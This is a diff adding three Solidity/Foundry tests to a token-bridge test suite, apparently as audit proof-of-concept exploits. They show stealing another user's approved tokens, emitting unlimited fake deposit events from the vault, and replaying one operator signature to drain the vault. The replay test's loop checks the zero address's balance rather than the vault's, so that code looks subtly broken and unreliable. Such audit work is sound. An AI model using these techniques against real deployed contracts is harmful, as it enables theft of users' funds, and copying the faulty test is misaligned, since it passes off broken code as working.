@@ -223,4 +223,69 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    function testUserCanMoveApprovedTokensOfOtherUsers() public {
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        uint256 depositAmount = token.balanceOf(user);
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, depositAmount);
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount);
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        vm.stopPrank();
+    }
+
+    function testCanTransferFromVaultToVault() public {
+        address attacker = makeAddr("attacker");
+        
+        uint256 vaultBalance = 500 ether;
+        deal(address(token), address(vault), vaultBalance);
+
+        // can trigger deposit event, self transfer tokens to the vault
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+
+        // can do this forever
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+    }
+
+    function testSignatureReplay() public {
+        address attacker = makeAddr("attacker");
+        // assume the vault already holds some token
+        uint256 vaultInitialBalance = 1000e18;
+        uint256 attackerInitialBalance = 100e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+        deal(address(token), attacker, attackerInitialBalance);
+
+        // an attacker can deposit tokens to L2
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
+
+        // signer is going to sign the withdrawal request
+        bytes memory message = abi.encode(
+            address(token), 
+            0, 
+            abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            operator.key, 
+            MessageHashUtils.toEthSignedMessageHash(keccak256(message))
+        );
+
+        while(token.balanceOf(address(0)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+        }
+
+        assertEq(token.balanceOf(address(vault)), 0);
+        assertEq(token.balanceOf(attacker), attackerInitialBalance + vaultInitialBalance);
+    }
 }
